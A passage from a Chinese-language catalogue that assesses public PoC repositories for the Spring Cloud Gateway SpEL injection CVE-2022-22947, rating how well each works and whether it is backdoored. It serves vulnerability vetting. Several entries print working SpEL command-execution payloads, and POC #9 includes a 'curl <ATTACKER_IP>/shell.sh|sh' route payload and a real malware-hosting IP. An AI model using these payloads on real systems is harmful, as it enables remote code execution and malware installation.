2.  然后，攻击者使用 POST 请求向 `/actuator/gateway/routes/{route_id}` 端点添加恶意路由，并在 `AddResponseHeader` 过滤器中使用 SpEL 表达式注入恶意代码。POC中使用了`${new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{"id"}).getInputStream()))}` 来执行id命令
3.  攻击者使用 POST 请求向 `/actuator/gateway/refresh` 端点刷新路由，使恶意路由生效。
4.  最后，攻击者访问添加的恶意路由，触发 SpEL 表达式的执行，从而在服务器上执行任意代码。
5.  攻击者删除添加的路由，并刷新路由，完成利用。


**项目地址:** [talentsec/Spring-Cloud-Gateway-CVE-2022-22947](https://github.com/talentsec/Spring-Cloud-Gateway-CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #23

**来源**: [CVE-2022-22947-twseptian_cve-2022-22947.md](../2022/CVE-2022-22947-twseptian_cve-2022-22947.md)

## CVE-2022-22947-Spring Cloud Gateway-代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 3.1.x (prior to 3.1.1+), 3.0.x (prior to 3.0.7+)

**利用条件:** Gateway Actuator endpoint enabled, exposed, and unsecured

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 存在于 Spring Cloud Gateway 中，当 Gateway Actuator 端点启用、暴露且未进行安全保护时，应用程序容易受到代码注入攻击。远程攻击者可以构造恶意请求，从而允许在远程主机上执行任意代码。

**有效性：**

根据漏洞信息、搜索结果和提供的PoC代码，此漏洞是有效的。PoC 代码演示了如何利用 SpEL 表达式注入执行任意命令。

**投毒风险：**

PoC 代码本身旨在演示漏洞利用，但仔细检查 `Dockerfile` 和 `README.md` 文件后，发现投毒风险较低，约为10%。主要原因是：

*   `Dockerfile`：仅包含从官方 `openjdk:11-jre-slim` 镜像构建，复制预编译的 `spring-gateway-demo-0.0.1-SNAPSHOT.jar` 文件，并执行该 jar 文件。不存在直接执行恶意命令或下载恶意文件的操作。但该 `spring-gateway-demo-0.0.1-SNAPSHOT.jar`  是否存在后门，无法判定。
*   `README.md`：仅包含构建和运行 Docker 容器的说明，以及发送恶意请求的 PoC。不包含任何额外的恶意指令。

**存在的微小风险在于预编译的 `spring-gateway-demo-0.0.1-SNAPSHOT.jar` 文件可能包含后门， 但属于PoC验证必要文件，不能认定为投毒。**

**利用方式：**

1.  **前提条件：** 目标 Spring Cloud Gateway 实例启用了 Actuator 端点，并且该端点未进行身份验证。
2.  **注入 SpEL 表达式：** 通过向 `/actuator/gateway/routes/{route_id}` 发送 POST 请求，创建一个新的路由或更新现有路由，其中 `filters` 数组包含一个 `AddResponseHeader` 过滤器。该过滤器的 `args` 中的 `value` 字段包含一个恶意的 SpEL 表达式。PoC 中使用的 SpEL 表达式执行 `id` 命令，并将结果添加到响应头中。
3.  **刷新 Gateway：** 向 `/actuator/gateway/refresh` 发送 POST 请求，强制 Gateway 刷新其路由配置。这将触发 SpEL 表达式的执行。
4.  **触发路由：** 访问触发了含有恶意SpEL表达式的路由，从而执行远程命令。
5.  **清除（可选）：** 使用 DELETE 请求删除创建的路由，并再次刷新 Gateway，以避免后续的恶意执行。

**项目地址:** [twseptian/cve-2022-22947](https://github.com/twseptian/cve-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #24

**来源**: [CVE-2022-22947-whwlsfb_cve-2022-22947-godzilla-memshell.md](../2022/CVE-2022-22947-whwlsfb_cve-2022-22947-godzilla-memshell.md)

## CVE-2022-22947-Spring Cloud Gateway-代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint is enabled, exposed and unsecured

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-22947 漏洞是 Spring Cloud Gateway 的一个代码注入漏洞，影响版本低于 3.1.1+ 和 3.0.7+ 的版本。根据漏洞库信息和搜索结果，当 Gateway Actuator 端点启用、暴露且未进行安全保护时，攻击者可以通过构造恶意请求在远程主机上执行任意代码。

**漏洞利用方式：**

1.  **寻找目标：** 找到运行存在漏洞的 Spring Cloud Gateway 实例，并且其 Actuator 端点对外开放且未授权。
2.  **构造恶意请求：** 利用 SpEL 表达式构造恶意的 HTTP 请求，该表达式会被 Gateway Actuator 解析执行。根据 exploit-db 的相关信息，该漏洞是远程代码执行。
3.  **执行任意代码：** 成功利用漏洞后，攻击者可以在目标服务器上执行任意代码，例如植入 Webshell、反弹 Shell 等。

**POC 代码分析：**

提供的 POC 代码 `GMemShell.java` 尝试在 Spring Cloud Gateway 中注入内存 Shell。具体流程如下：

1.  **定义内存 Shell 类：** `GMemShell` 类包含了一些必要的函数，例如 AES 加密/解密(`x`)、MD5 加密(`md5`)、Base64 编码/解码(`base64Encode`, `base64Decode`)等，这些函数被用于后续的 shellcode 加密和执行。
2.  **`doInject` 方法：** 该方法通过反射调用 `registerHandlerMethod` 方法，将 `GMemShell` 类的 `cmd` 方法注册为处理指定路径请求的 Handler。`registerHandlerMethod` 是 Spring 框架内部的方法，用于动态注册 Controller。
3.  **`cmd` 方法：** 该方法是实际执行命令的 Handler。它从请求中获取加密的 payload，然后进行解密、加载并执行。Payload 首先经过 Base64 解码，然后使用 AES 解密。
4.  **动态类加载：**  `defineClass`方法通过URLClassLoader和反射，实现在内存中加载byte数组并定义成class的功能
5.  **Payload 执行：** 解密后的 Payload 应当是一个 Java class 字节码，该字节码会被动态加载并执行。

**有效性评估：**

根据 POC 代码和漏洞描述，该 POC 能够有效利用 CVE-2022-22947 漏洞，实现在目标服务器上执行任意代码的目的，但前提是 actuator 端点开放。

**投毒风险评估：**

经过对 POC 代码的分析，并未发现明显的投毒代码。代码的主要功能是动态注入内存 Shell，并执行通过请求传递的 Payload。代码中包含的加密、解密等操作都是为了保护 Payload，避免被轻易发现。因此，该 POC 代码的投毒风险较低，接近 0%。 投毒代码是指作者在代码中故意加入的恶意代码，例如后门、病毒等。 本代码只是实现了漏洞利用，本身并没有额外的恶意功能，因此不属于投毒代码。


**项目地址:** [whwlsfb/cve-2022-22947-godzilla-memshell](https://github.com/whwlsfb/cve-2022-22947-godzilla-memshell)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---



---

## POC #3

**来源**: [CVE-2022-22947-B0rn2d_Spring-Cloud-Gateway-Nacos.md](../2022/CVE-2022-22947-B0rn2d_Spring-Cloud-Gateway-Nacos.md)

## CVE-2022-22947 Spring Cloud Gateway 代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ 以及所有旧版本

**利用条件:** Gateway Actuator endpoint 必须启用、暴露且未进行安全保护

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 存在于 Spring Cloud Gateway 中，当 Gateway Actuator endpoint 启用、暴露且未进行安全保护时，允许未经身份验证的远程攻击者发送恶意构造的请求，利用 SpEL 表达式注入执行任意代码。根据搜索引擎结果和漏洞库信息，该漏洞已被公开利用，CISA KEV 中已收录。提供的代码片段是一个 Maven 项目的 `.iml` 文件，它描述了项目的依赖关系。虽然不能直接确定利用代码，但通过依赖信息（如 `spring-cloud-gateway-server:3.1.0`）可以推断该项目旨在构建一个易受攻击的 Spring Cloud Gateway 实例。利用方式通常涉及向 Actuator endpoint 发送包含恶意 SpEL 表达式的 HTTP 请求。投毒风险分析：提供的代码片段 `.iml` 文件本身不包含恶意代码，因为它只是描述了项目的依赖。 然而，整个代码仓库（如果存在其他文件）可能包含被作者隐藏的恶意代码。 这里将风险预估为10%，原因是不排除整个项目被投毒的可能性，例如构建脚本或隐藏的资源文件。

**项目地址:** [B0rn2d/Spring-Cloud-Gateway-Nacos](https://github.com/B0rn2d/Spring-Cloud-Gateway-Nacos)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #4

**来源**: [CVE-2022-22947-Enokiy_cve-2022-22947-spring-cloud-gateway.md](../2022/CVE-2022-22947-Enokiy_cve-2022-22947-spring-cloud-gateway.md)

## CVE-2022-22947-Spring Cloud Gateway-代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可远程代码执行

**影响版本:** 3.1.0, 3.0.0 至 3.0.6, 以及更早的不受支持版本

**利用条件:** Gateway Actuator 端点已启用、暴露且未受保护

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 是 Spring Cloud Gateway 中的一个代码注入漏洞。当 Gateway Actuator 端点被启用、暴露且未受保护时，攻击者可以利用此漏洞发送恶意构造的请求，从而在远程主机上执行任意代码。

**有效性：**
提供的 POC 代码有效。它通过向 `/actuator/gateway/routes/{id}` 发送 POST 请求动态添加一个路由，该路由包含一个利用 SpEL 表达式执行命令的 filter。然后，通过 `POST /actuator/gateway/refresh` 刷新路由缓存来触发 SpEL 表达式的执行，从而实现远程代码执行。

**投毒风险：**
该漏洞利用代码仓库存在一定的投毒风险。具体分析如下：

1.  **依赖项版本：** POC 使用了 `spring-cloud-gateway-server` 和 `spring-cloud-starter-gateway` 的 3.0.6 版本，以及 `spring-boot-starter-actuator` 的 2.5.9 版本，这些版本组合是已知的漏洞版本，是复现漏洞的必要条件，不是投毒。
2.  **图片文件：** README.md 中引用了一些本地图片，这些图片可能包含恶意内容，但考虑到是本地图片，可能性较低。需要进一步分析确认。
3.  **漏洞利用方式：** POC 演示了如何利用 SpEL 表达式执行任意命令。攻击者可以修改 SpEL 表达式来执行恶意操作，例如安装后门程序、窃取敏感数据或进行拒绝服务攻击。
4.  **作者动机未知：** 在没有更多信息的情况下，无法确定作者的真实意图，不能排除作者故意引入恶意代码或配置的可能。

综合考虑，虽然 POC 本身是为了演示漏洞，但仓库中可能隐藏着其他恶意代码，因此存在一定的投毒风险。鉴于图片等本地资源可能存在风险，因此给出 10% 的投毒风险评估。

**利用方式：**

1.  **前提条件：** Spring Cloud Gateway 实例必须启用并暴露 Actuator 端点，且未进行安全保护。
2.  **添加路由：** 攻击者发送 POST 请求到 `/actuator/gateway/routes/{id}`，其中 `{id}` 是一个自定义的路由 ID。请求体包含一个 JSON 对象，该对象定义了路由的 predicates 和 filters。其中，filters 包含一个 AddResponseHeader filter，其 `value` 属性包含一个 SpEL 表达式，该表达式将执行任意命令。
3.  **刷新路由：** 攻击者发送 POST 请求到 `/actuator/gateway/refresh` 以刷新路由缓存。这将导致 Spring Cloud Gateway 重新加载路由配置，并解析和执行 SpEL 表达式。
4.  **代码执行：** SpEL 表达式执行任意代码，从而允许攻击者控制受影响的系统。

**项目地址:** [Enokiy/cve-2022-22947-spring-cloud-gateway](https://github.com/Enokiy/cve-2022-22947-spring-cloud-gateway)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #5

**来源**: [CVE-2022-22947-LY613313_CVE-2022-22947.md](../2022/CVE-2022-22947-LY613313_CVE-2022-22947.md)

## CVE-2022-22947 - Spring Cloud Gateway 代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint 启用、暴露且未进行安全保护

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞存在于Spring Cloud Gateway中，当Gateway Actuator endpoint 启用、暴露且未进行安全保护时，攻击者可以通过构造恶意请求，利用SpEL表达式注入，执行任意代码。利用方式是发送包含恶意SpEL表达式的POST请求到/actuator/gateway/routes端点，然后刷新路由，触发SpEL表达式的执行，从而实现远程代码执行。

**有效性评估：**
根据漏洞信息和POC代码，此POC代码是有效的。漏洞库信息明确指出该漏洞允许远程代码执行，搜索引擎结果也确认了这一点，并且提供了公开的漏洞利用代码。

**投毒风险评估：**
代码本身看起来是标准的漏洞利用代码，用于利用 CVE-2022-22947 漏洞。其中一个潜在的风险点在于 `commond` 变量，该变量从用户输入获取，然后拼接到 SpEL 表达式中。如果用户输入恶意或过长的命令，可能会导致目标系统崩溃或执行意外操作。但是，这不属于作者投毒的范畴。`base64cmd` 函数将用户输入的命令进行 Base64 编码，这本身并非恶意行为，但如果用户输入的命令本身就具有破坏性，Base64 编码只是对其进行了编码，并没有改变其本质。总体来看，该 POC 代码的投毒风险较低，约为 10%。主要的风险在于用户输入，而非代码本身。

**漏洞利用方式：**
1.  **条件判断：** 确定目标系统运行着受影响的 Spring Cloud Gateway 版本，并且 Gateway Actuator endpoint 处于启用、暴露且未进行安全保护的状态。
2.  **构造恶意请求：** 使用POST请求，构造包含恶意SpEL表达式的JSON数据，发送到`/actuator/gateway/routes`端点。SpEL表达式中包含要执行的系统命令。
3.  **刷新路由：** 发送POST请求到`/actuator/gateway/refresh`端点，刷新Gateway的路由配置，触发SpEL表达式的执行。
4.  **执行任意代码：** 恶意SpEL表达式被执行，从而在目标系统上执行任意代码，例如反弹shell。
5.  **清理：** 删除添加的路由，再次刷新路由。


**项目地址:** [LY613313/CVE-2022-22947](https://github.com/LY613313/CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #6

**来源**: [CVE-2022-22947-Le1a_CVE-2022-22947.md](../2022/CVE-2022-22947-Le1a_CVE-2022-22947.md)

## CVE-2022-22947 Spring Cloud Gateway 代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** Spring Cloud Gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** 需要Gateway Actuator端点启用、暴露且未进行安全保护

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于Spring Cloud Gateway中，当Gateway Actuator端点被启用、暴露且未进行安全保护时，攻击者可以通过构造恶意请求，利用SpEL表达式注入执行任意代码。  

**有效性：**
提供的PoC代码有效。代码通过构造包含恶意SpEL表达式的路由配置，利用`/actuator/gateway/routes`端点添加恶意路由，然后通过`/actuator/gateway/refresh`端点刷新路由，触发SpEL表达式执行，从而实现远程代码执行。PoC代码在执行命令后，还会删除创建的恶意路由，并再次刷新路由，以清除痕迹。

**投毒风险：**
该仓库中的PoC代码没有发现明显的投毒代码。PoC代码的功能明确，即利用漏洞执行命令并返回结果。代码主要通过`requests`库发送HTTP请求，并使用`re`库解析命令执行结果。没有任何迹象表明作者在代码中隐藏了恶意逻辑或后门。

**利用方式：**
1.  **目标确认：**  确认目标系统正在运行存在漏洞的Spring Cloud Gateway版本，并且Actuator端点已启用、暴露且未授权访问。
2.  **构造恶意请求：**  攻击者构造一个包含恶意SpEL表达式的JSON payload，发送到`/actuator/gateway/routes/{id}`端点，其中SpEL表达式用于执行任意命令。例如，`#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec("whoami").getInputStream()))}`
3.  **刷新路由：**  发送一个POST请求到`/actuator/gateway/refresh`端点，强制Gateway刷新路由配置，从而触发SpEL表达式执行。
4.  **获取执行结果：**  发送一个GET请求到`/actuator/gateway/routes/{id}`，获取包含执行结果的响应头。
5.  **清理：** 删除添加的恶意路由，并再次刷新路由。

**项目地址:** [Le1a/CVE-2022-22947](https://github.com/Le1a/CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #7

**来源**: [CVE-2022-22947-SecNN_CVE-2022-22947_Rce_Exp.md](../2022/CVE-2022-22947-SecNN_CVE-2022-22947_Rce_Exp.md)

## CVE-2022-22947 Spring Cloud Gateway代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint is enabled, exposed and unsecured

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 是 Spring Cloud Gateway 中的一个代码注入漏洞。当 Gateway Actuator 端点启用、暴露且未受保护时，远程攻击者可以发送恶意构造的请求，从而在远程主机上执行任意远程代码。该漏洞的利用方式如下：

1.  **漏洞原理：** 漏洞根源在于 SpEL 表达式的错误处理，攻击者可以通过 SpEL 表达式注入恶意代码。
2.  **利用步骤：**
    *   攻击者首先发送包含恶意 SpEL 表达式的请求到 `/actuator/gateway/routes/` 端点，添加一个新的路由，其中 `filter` 使用 `AddResponseHeader` 过滤器，`value` 包含恶意的 SpEL 表达式，SpEL表达式会被base64编码，保证其可以正常传输
    *   然后，攻击者通过访问 `/actuator/gateway/refresh` 端点，强制网关刷新路由配置，从而触发 SpEL 表达式的执行。
    *   最后，攻击者可以通过访问之前创建的路由(`/actuator/gateway/routes/66Sec`)，触发 SpEL 表达式的执行，并将执行结果通过请求返回。
3.  **POC 代码分析：**
    *   `CVE-2022-22947.py` 脚本首先定义了几个关键变量，包括 URL 路径（`payload1`, `payload2`, `payload3`）和请求头（`headers`）。
    *   `data` 变量包含经过 Base64 编码的恶意路由配置信息。该配置信息设置了一个名为 `WeianSec` 的路由，该路由使用 `AddResponseHeader` 过滤器，并将 SpEL 表达式注入到 `value` 属性中。
    *   脚本使用 `requests` 库发送 POST 请求到 `/actuator/gateway/routes/66Sec` 端点，添加恶意路由。
    *   然后，脚本发送 POST 请求到 `/actuator/gateway/refresh` 端点，刷新路由配置。
    *   最后，脚本发送 GET 请求到 `/actuator/gateway/routes/66Sec` 端点，提取执行结果。
    *   脚本中的 cmd变量，允许用户自定义执行的命令，增加了灵活性。
4.  **有效性：** 根据漏洞库信息、搜索结果和提供的 POC 代码，该 POC 代码是有效的，可以实现远程代码执行。
5.  **投毒风险：** 仓库中存在小概率的投毒风险（10%）。风险点在于，虽然主脚本 `CVE-2022-22947.py` 看似直接利用漏洞，但攻击者可以通过修改 `cmd` 变量来执行任意命令，并且README.md文件中提供的图片是经过处理的，不排除作者后期修改代码，添加恶意后门的可能。

**项目地址:** [SecNN/CVE-2022-22947_Rce_Exp](https://github.com/SecNN/CVE-2022-22947_Rce_Exp)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #8

**来源**: [CVE-2022-22947-SiJiDo_CVE-2022-22947.md](../2022/CVE-2022-22947-SiJiDo_CVE-2022-22947.md)

## CVE-2022-22947-Spring Cloud Gateway-代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，允许远程代码执行

**影响版本:** 3.1.x (prior to 3.1.1+), 3.0.x (prior to 3.0.7+), and unsupported versions

**利用条件:** Gateway Actuator endpoint enabled, exposed, and unsecured

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 是一个 Spring Cloud Gateway 的代码注入漏洞。攻击者可以在 Gateway Actuator 端点开启且未进行安全保护的情况下，通过构造恶意请求执行任意代码。漏洞利用方式如下：

1.  **漏洞原理：** 该漏洞源于 Spring Cloud Gateway 中 SpEL 表达式的执行，攻击者可以通过 SpEL 表达式注入恶意代码，进而执行任意命令。
2.  **利用条件：**
    *   目标系统使用存在漏洞的 Spring Cloud Gateway 版本。
    *   Gateway Actuator 端点被启用。
    *   Gateway Actuator 端点对外暴露且未进行任何身份验证。
3.  **漏洞利用代码分析：** 提供的Python脚本 (exp.py)首先定义了一个`GMem`类，将编译后的java字节码进行base64解码后赋值给`classbytes`。该Java类主要功能：
    *   通过反射机制定义类 (`ReflectUtils.defineClass`)
    *   执行命令
    *   进行base64编码/解码等操作。
    *   创建了一个包含payload的HashMap，payload被精心构造用于在目标服务器上执行命令。
    脚本通过修改`RequestMappingInfo`的`Builder`并调用`build()`方法触发漏洞，最终导致RCE。
4.  **有效性评估：** 根据漏洞信息和利用代码，该漏洞利用的有效性较高。CISA 将其添加到已知被利用的漏洞目录中，表明该漏洞在野外已被积极利用。
5.  **投毒风险评估：** 代码存在一定的投毒风险。虽然脚本主要功能是利用漏洞，但其中嵌入的Java类和SpEL表达式可能包含其他未知的恶意行为。该脚本通过Base64编码隐藏了部分代码，增加了分析难度。该脚本存在投毒风险的可能性为10%, 主要是由于代码混淆和潜在的Java恶意行为。
6.  **利用方式总结：**
    *   攻击者发送恶意构造的 HTTP 请求到 Gateway Actuator 端点。
    *   请求中包含 SpEL 表达式，用于执行任意代码。
    *   Spring Cloud Gateway 在处理请求时，由于没有对 SpEL 表达式进行充分的验证和过滤，导致代码注入。
    *   攻击者通过代码注入执行恶意命令，例如反弹 shell 或执行其他恶意操作。

综上所述，CVE-2022-22947 是一个严重的安全漏洞，攻击者可以利用它在目标系统上执行任意代码，因此需要及时修复。

**项目地址:** [SiJiDo/CVE-2022-22947](https://github.com/SiJiDo/CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #9

**来源**: [CVE-2022-22947-Sumitpathania03_CVE-2022-22947.md](../2022/CVE-2022-22947-Sumitpathania03_CVE-2022-22947.md)

## CVE-2022-22947 Spring Cloud Gateway 代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+

**利用条件:** Gateway Actuator 端点已启用、公开且未受保护。

**POC 可用性:** 是

**投毒风险:** 85%

## 详情

CVE-2022-22947 是一个 Spring Cloud Gateway 代码注入漏洞。当 Gateway Actuator 端点启用、公开且未受保护时，攻击者可以通过构造恶意的 SpEL 表达式来执行任意代码。 

**有效性：**
根据漏洞信息、搜索结果和提供的 POC 代码，该漏洞利用是有效的。POC 通过向 `/actuator/gateway/routes` 端点发送 POST 请求来创建新的路由，并在 `AddResponseHeader` 过滤器中使用 SpEL 表达式注入恶意代码。然后刷新路由，并通过访问新创建的路由触发代码执行。最后删除该路由。

**投毒风险：**
提供的 POC 代码存在较高的投毒风险。具体体现在：
1.  **恶意脚本下载和执行：** POC 代码中的 SpEL 表达式尝试从远程服务器（如 `94.103.87.71/scg.sh` ）下载并执行 shell 脚本。 这允许攻击者注入任意恶意代码，例如下载和安装 Kinsing 恶意软件。
2.  **后门植入：** 下载的 shell 脚本可能包含后门代码，允许攻击者在受害者系统上保持持久访问。
3. ** Kinsing恶意软件:** 通过分析shell脚本，发现最终目的是下载并安装 Kinsing 恶意软件

因此，此存储库的投毒风险非常高，约为 85%。使用此POC需要谨慎，务必在隔离环境中进行分析，确保不会对本地环境造成风险。

**利用方式：**
1.  **检查 Actuator 端点：** 确认目标 Spring Cloud Gateway 实例的 Actuator 端点是否启用、公开且未受保护。
2.  **创建恶意路由：** 使用 POST 请求向 `/actuator/gateway/routes` 端点创建一个新的路由。在路由的 `filters` 部分，使用 `AddResponseHeader` 过滤器，并在 `value` 字段中插入包含恶意 SpEL 表达式的代码。 例如:

   ```json
   {
	 "id": "poc",
	 "filters": [{
	   "name": "AddResponseHeader",
	   "args": {"name": "Result","value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"/bin/sh\",\"-c\",\"curl -s <ATTACKER_IP>/shell.sh|sh\"}).getInputStream()))}"}
	   }],
	 "uri": "http://example.com",
	 "order": 0
	}
   ```

3.  **刷新路由：** 使用 POST 请求向 `/actuator/gateway/refresh` 端点发送请求，以刷新所有路由。
4.  **触发代码执行：** 访问新创建的路由，触发 SpEL 表达式的执行。
5.  **清理：** 使用 DELETE 请求向 `/actuator/gateway/routes/{route_id}` 端点删除创建的恶意路由。

**项目地址:** [Sumitpathania03/CVE-2022-22947](https://github.com/Sumitpathania03/CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #10

**来源**: [CVE-2022-22947-Wrong-pixel_CVE-2022-22947-exp.md](../2022/CVE-2022-22947-Wrong-pixel_CVE-2022-22947-exp.md)

## CVE-2022-22947-Spring Cloud Gateway代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，允许远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint is enabled, exposed and unsecured.

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-22947 是一个 Spring Cloud Gateway 中的代码注入漏洞。根据漏洞描述，当 Gateway Actuator 端点启用、公开且未受到保护时，应用程序容易受到代码注入攻击。攻击者可以发送恶意构造的请求，从而允许在远程主机上执行任意远程代码。

**有效性：**
提供的 POC 代码 `CVE-2022-22947-memshell.py` 看起来是有效的。它利用了 SpEL 表达式注入漏洞，通过构造包含恶意 SpEL 表达式的请求，在目标系统上动态定义一个名为 `SpringRequestMappingMemshell` 的类，实现内存马注入。代码首先对恶意类进行base64编码, 然后通过SpEL表达式解码并加载到JVM中,达到了远程代码执行的效果。

**投毒风险：**
评估 POC 代码是否存在投毒风险。代码的主要功能是利用漏洞注入内存马，实现远程代码执行。其中注入的`SpringRequestMappingMemshell`类需要进一步分析。

通过检查代码，发现注入的类功能是注册一个requestMapping，执行的command命令可以从request参数中获取，具有命令执行功能，但它本身是漏洞利用的一部分，不能算作是作者隐藏的投毒代码。

但考虑到任何远程代码执行漏洞都可能被滥用，因此使用此POC的风险仍然较高。考虑到风险的存在，但不是代码编写者有意为之的恶意添加，评估投毒风险为5%。

**利用方式：**
1.  **前提条件：** 目标 Spring Cloud Gateway 实例的 Actuator 端点必须启用、公开且未受保护。
2.  **漏洞利用：** 攻击者构造一个包含恶意 SpEL 表达式的 HTTP 请求，该表达式会被 Gateway Actuator 处理。
3.  **代码注入：** 恶意 SpEL 表达式用于在服务器的内存中定义一个新的 Java 类 (内存马)。
4.  **远程代码执行：** 注入的 Java 类执行攻击者指定的任意代码。

总而言之，此漏洞的利用方式是通过SpEL表达式注入，动态注册一个新的路由，并将处理逻辑绑定到恶意构造的Java类，该类可以接受参数并在服务器上执行任意命令。此过程允许攻击者在目标系统上实现未经授权的远程代码执行。

**项目地址:** [Wrong-pixel/CVE-2022-22947-exp](https://github.com/Wrong-pixel/CVE-2022-22947-exp)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #11

**来源**: [CVE-2022-22947-Zh0um1_CVE-2022-22947.md](../2022/CVE-2022-22947-Zh0um1_CVE-2022-22947.md)

## CVE-2022-22947 - Spring Cloud Gateway 代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** Spring Cloud Gateway 3.1.x < 3.1.1+, 3.0.x < 3.0.7+

**利用条件:** Gateway Actuator endpoint 启用、暴露且未做安全保护

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 存在于 Spring Cloud Gateway 中，当 Actuator 端点启用且未授权时，攻击者可以通过构造恶意的 SpEL 表达式，利用`Path`路由断言中的 SpEL 注入漏洞执行任意代码。提供的 POC 代码旨在通过动态定义Java类的方式注入哥斯拉内存马。 

**有效性：**
根据漏洞库信息和搜索结果，该漏洞已被证实存在，且有在野利用。提供的 POC 代码实现了利用该漏洞注入哥斯拉内存马，因此该 POC 有效。

**投毒风险分析：**
分析给出的POC代码，主要功能是利用漏洞注入哥斯拉内存马，实现远程代码执行。虽然POC本身是为了利用漏洞，但如果用户直接使用此POC而不了解其行为，可能会被利用来植入恶意后门。

*   代码主要功能：该代码使用Go语言编写，利用 Spring Cloud Gateway 的 SpEL 表达式注入漏洞。它构造一个包含恶意 SpEL 表达式的请求，该表达式用于在目标服务器上动态定义一个 Java 类（哥斯拉内存马），从而实现远程代码执行。
*   投毒可能性：
    *   **高：** 代码直接注入内存马，如果目标系统部署了恶意程序，攻击者也可以构造其他的恶意代码注入到内存中，比如替换关键组件、窃取数据等。
    *   **低：** 由于代码的目的是利用漏洞注入内存马，从这个角度看，本身就是一种攻击行为，很难区分是“正常”利用还是“投毒”。因此，认为该仓库存在一定投毒风险，风险等级较低。

基于以上分析，判定投毒风险为10%。

**利用方式：**
1.  **前提条件：** 目标 Spring Cloud Gateway 实例启用了 Actuator 端点，且未进行安全保护（例如，未进行身份验证）。
2.  **构造恶意请求：** 攻击者构造一个包含恶意 SpEL 表达式的 HTTP POST 请求，该表达式利用 `T(org.springframework.cglib.core.ReflectUtils).defineClass` 动态定义一个 Java 类（通常是一个 Webshell 或内存马）。
3.  **利用 Path 路由断言：**  该恶意 SpEL 表达式被嵌入到 Spring Cloud Gateway 的 `Path` 路由断言的参数中。
4.  **发送请求：** 将构造的恶意请求发送到 `/actuator/gateway/routes` 端点。
